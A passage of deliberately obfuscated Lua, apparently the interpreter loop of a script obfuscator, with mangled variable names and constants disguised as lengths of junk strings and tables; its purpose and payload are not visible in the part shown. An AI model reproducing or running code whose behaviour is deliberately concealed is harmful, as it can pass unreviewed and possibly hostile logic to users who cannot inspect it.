111";}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("IKNN")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dK")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kWW")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ID")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("h1V")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("rE42")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GP")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("uNX")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("EqQN")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Xx")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("1vX")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("KYz3")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ss")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("tIv")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("bC")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ri7")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eh")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GXS")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("gYlF")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("tV")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vq")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("trx")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zefZ")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("as")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("93b")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ox")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ogD")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eT")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dGB")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("xBPK")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("It")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("c2")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("bCb")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("DXFX")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rn")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("OoT")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("k7XT")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{493;412;668;355};{900;760;417;989};}]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("jKK")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("rm")];btwbaby_llIlIIIl=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{674;448;633;526};{122;798;103;69};{691;99;413;967};}]];btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]=btwbaby_llIlIIIl;btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llIlIIIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("n6Me")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vK")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("jlE")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("TU")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("pl")]btwbaby_llIIIlIlllll,btwbaby_IlIlIIllIIlIIIIllIIIIll=btwbaby_lIllllllIIllIIlIll(btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]))btwbaby_lIlIIllIllIlIIlI=btwbaby_IlIlIIllIIlIIIIllIIIIll+btwbaby_IIlIllIIlIlIIlIIIl-1 btwbaby_lIIIlIIIIllllIlIllllI=0;for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIlIllIIlIlIIlIIIl,btwbaby_lIlIIllIllIlIIlI do btwbaby_lIIIlIIIIllllIlIllllI=btwbaby_lIIIlIIIIllllIlIllllI+1;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_llIIIlIlllll[btwbaby_lIIIlIIIIllllIlIllllI];end;btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("YG")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_lIlIIllIllIlIIlI))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4i")]]={};btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{711;674;250;965};"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("uGU")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("i695")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("PD")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("fN5")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ec")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("SY1")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("TzhF")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kb")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{143;585;63;753};"1 + 1 = 111";{232;531;767;608};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("nze9")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("KG")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("OS")];btwbaby_llIlIIIl=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("s9C")]];btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]=btwbaby_llIlIIIl;btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llIlIIIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cMfO")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("niJ")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Kv")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("by2")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("8s")]btwbaby_llIIIlIlllll,btwbaby_IlIlIIllIIlIIIIllIIIIll=btwbaby_lIllllllIIllIIlIll(btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1]))btwbaby_lIlIIllIllIlIIlI=btwbaby_IlIlIIllIIlIIIIllIIIIll+btwbaby_IIlIllIIlIlIIlIIIl-1 btwbaby_lIIIlIIIIllllIlIllllI=0;for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIlIllIIlIlIIlIIIl,btwbaby_lIlIIllIllIlIIlI do btwbaby_lIIIlIIIIllllIlIllllI=btwbaby_lIIIlIIIIllllIlIllllI+1;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_llIIIlIlllll[btwbaby_lIIIlIIIIllllIlIllllI];end;btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ln")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_lIlIIllIllIlIIlI))end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#{"1 + 1 = 111";{61;758;134;873};"1 + 1 = 111";"1 + 1 = 111";{452;803;91;189};{764;708;520;82};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{968;449;642;282};{786;830;673;73};"1 + 1 = 111";"1 + 1 = 111";}then if btwbaby_IIlIllIIlIlIIlIIIl==#("7oNb1hGxW5Zy")then local btwbaby_IIIllIlIIlI=btwbaby_IllIIIllIlIIIIIlIIIllII[#("jeg")];local btwbaby_llIIllIll=btwbaby_llllIllI[btwbaby_IIIllIlIIlI]for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("WtMT")]do btwbaby_llIIllIll=btwbaby_llIIllIll..btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII];end;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qy")]]=btwbaby_llIIllIll;else btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{826;517;971;674};{840;289;664;751};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("FGU")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ibC2")];end;elseif btwbaby_IIlIllIIlIlIIlIIIl==#{{346;677;81;373};{663;183;337;721};"1 + 1 = 111";{3;822;114;470};{839;544;121;174};{328;324;210;414};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{246;605;640;100};"1 + 1 = 111";"1 + 1 = 111";{446;249;319;359};{590;861;91;227};}then local btwbaby_IllIIlllIIIIlIllIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("KM")];local btwbaby_lIIlIlIIlIlIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("CDag")];local btwbaby_IIIllIlIIlI=btwbaby_IllIIlllIIIIlIllIl+2 local btwbaby_IllIIlllIIIIlIllIl={btwbaby_llllIllI[btwbaby_IllIIlllIIIIlIllIl](btwbaby_llllIllI[btwbaby_IllIIlllIIIIlIllIl+1],btwbaby_llllIllI[btwbaby_IIIllIlIIlI])};for btwbaby_IllIIIllIlIIIIIlIIIllII=1,btwbaby_lIIlIlIIlIlIl do btwbaby_llllIllI[btwbaby_IIIllIlIIlI+btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII];end;local btwbaby_IllIIlllIIIIlIllIl=btwbaby_IllIIlllIIIIlIllIl[1]if btwbaby_IllIIlllIIIIlIllIl then btwbaby_llllIllI[btwbaby_IIIllIlIIlI]=btwbaby_IllIIlllIIIIlIllIl btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#("OZt")];else btwbaby_llIIllIll=btwbaby_llIIllIll+1;end;else local btwbaby_lIIIlIIIIllllIlIllllI;local btwbaby_IIIlIlIIIIlllllIlIlIIlI,btwbaby_llIIIlIlllll;local btwbaby_IIlIllIIlIlIIlIIIl;local btwbaby_IlIlIIllIIlIIIIllIIIIll;local btwbaby_llIlIIIl;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("H2")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{314;315;689;119};{133;164;299;365};"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("JI")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("pzF")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("BCTR")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("R3O")];btwbaby_IlIlIIllIIlIIIIllIIIIll=btwbaby_llllIllI[btwbaby_llIlIIIl]for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_llIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("ePaz")]do btwbaby_IlIlIIllIIlIIIIllIIIIll=btwbaby_IlIlIIllIIlIIIIllIIIIll..btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII];end;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("pP")]]=btwbaby_IlIlIIllIIlIIIIllIIIIll;btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("3k")]]={};btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qP")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("dA9")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("V2Xk")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("nr")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("edT")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("KR")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("595")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("L07x")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("a2")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("lXK")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZtqG")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("23")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{341;388;58;400};{489;879;165;65};{251;941;945;428};}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("DJ")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("QBs")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("S6pK")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8d")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("KRN")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{482;333;357;428};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2ij")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Uy8p")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oa")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("AVe")]][btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("L2zy")]]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qS")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{658;299;721;641};"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("hsnW")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("DR")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("g9e")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("pnqs")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{50;561;131;651};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{723;646;818;158};{829;892;73;559};{908;353;668;756};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("LFOk")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("nY")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YE7")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ea")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ikO")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("JG")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gLv")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("hkm6")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{810;112;205;581};{403;967;462;952};}]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dX")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("BgC")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hABD")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{877;295;149;482};{227;340;231;246};}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0Pq")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("R4")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("TFF")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("B8")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Gjy")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("x4Id")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ds")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl+1])btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GH")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("xqG")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("TCKT")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlII